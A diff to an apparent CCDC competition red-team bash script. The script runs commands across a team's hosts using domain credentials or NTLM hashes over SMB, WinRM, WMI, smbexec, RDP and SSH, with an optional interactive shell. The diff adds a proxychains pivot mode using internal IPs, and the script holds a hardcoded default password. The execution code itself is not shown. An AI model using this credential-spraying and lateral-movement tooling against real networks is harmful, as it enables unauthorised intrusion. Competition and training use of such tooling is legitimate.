@@ -1,12 +1,13 @@
 #!/bin/bash
 # ================================================
 # CCDC Remote Exec Script
-# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash] [-s]
+# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash] [-s] [-x]
 #
 #   host  → hostname (curiosity), number (1-7), or omit to list
 #   -c    → command to run (default: whoami /all)
 #   -p    → password or NTLM hash (default: Th3cake1salie!)
 #   -s    → shell mode: drop into interactive shell on first hit
+#   -x    → use internal 172.16.x.x IPs (proxychains/pivot mode)
 #
 #   Tries DA accounts first, then falls back to all users in users.txt
 #   Order: SMB → WinRM → WMI → smbexec → RDP → SSH
@@ -14,7 +15,7 @@
 # ================================================
 
 usage() {
-  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash] [-s]"
+  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash] [-s] [-x]"
   echo ""
   echo "  host can be:"
   echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
@@ -24,6 +25,7 @@ usage() {
   echo "  -c CMD   command to run remotely (default: whoami /all)"
   echo "  -p PASS  password or NTLM hash"
   echo "  -s       shell mode — drop into interactive shell on first successful auth"
+  echo "  -x       use internal 172.16.x.x IPs (for proxychains pivot)"
   echo ""
   echo "Examples:"
   echo "  $0 5                               # list all boxes"
@@ -31,7 +33,7 @@ usage() {
   echo "  $0 5 anger -c \"ipconfig\""
   echo "  $0 5 3 -c \"net user\" -p Th3cake1salie!"
   echo "  $0 5 curiosity -s                  # drop into shell"
-  echo "  $0 5 curiosity -p aad3b435b51404eeaad3b435b51404ee:0aa78d8d13abad46a59ef0a63f6ae924"
+  echo "  $0 5 -x curiosity                  # use internal IP via proxychains"
   exit 1
 }
 
@@ -45,6 +47,7 @@ DOMAIN="aperturesciencelabs.org"
 PASS="Th3cake1salie!"
 CMD="whoami /all"
 SHELL_MODE=0
+USE_INTERNAL=0
 TARGET_ARG=""
 
 # Grab optional positional host arg (before any flags)
@@ -52,11 +55,12 @@ if [[ $# -gt 0 && "$1" != -* ]]; then
   TARGET_ARG="$1"; shift
 fi
 
-while getopts "p:c:s" opt; do
+while getopts "p:c:sx" opt; do
   case "$opt" in
     p) PASS="$OPTARG" ;;
     c) CMD="$OPTARG" ;;
     s) SHELL_MODE=1 ;;
+    x) USE_INTERNAL=1 ;;
     *) usage ;;
   esac
 done
@@ -78,7 +82,7 @@ declare -A NUM_HOST=(
   [7]="adventure"
 )
 
-# Hostname → last octet
+# Hostname → last octet (external)
 declare -A HOST_OCTET=(
   ["curiosity"]=140
   ["morality"]=10
@@ -87,6 +91,17 @@ declare -A HOST_OCTET=(
   ["fact"]=71
   ["space"]=141
   ["adventure"]=72
+)
+
+# Hostname → internal IP (172.16.x.x)
+declare -A HOST_INTERNAL=(
+  ["curiosity"]="172.16.3.140"
+  ["morality"]="172.16.1.10"
+  ["intelligence"]="172.16.1.11"
+  ["anger"]="172.16.2.70"
+  ["fact"]="172.16.2.71"
+  ["space"]="172.16.3.141"
+  ["adventure"]="172.16.2.72"
 )
 
 HOST_ORDER=(curiosity morality intelligence anger fact space adventure)
@@ -105,7 +120,11 @@ if [[ -z "$TARGET_ARG" ]]; then
   echo "[+] Team ${TEAM} — Available hosts:"
   for desc in "${HOST_DESC[@]}"; do
     local_host="${HOST_ORDER[$((${desc:0:1}-1))]}"
-    ip="192.168.20${TEAM}.${HOST_OCTET[$local_host]}"
+    if [[ $USE_INTERNAL -eq 1 ]]; then
+      ip="${HOST_INTERNAL[$local_host]}"
+    else
+      ip="192.168.20${TEAM}.${HOST_OCTET[$local_host]}"
+    fi
     printf "    %s  [%s]\n" "$desc" "$ip"
   done
   echo ""
@@ -125,7 +144,11 @@ else
 fi
 
 LAST_OCTET="${HOST_OCTET[$HOSTNAME]}"
-IP="192.168.20${TEAM}.${LAST_OCTET}"
+if [[ $USE_INTERNAL -eq 1 ]]; then
+  IP="${HOST_INTERNAL[$HOSTNAME]}"
+else
+  IP="192.168.20${TEAM}.${LAST_OCTET}"
+fi
 FQDN="${HOSTNAME}.${DOMAIN}"
 
 # ====================== AUTH FLAGS ======================
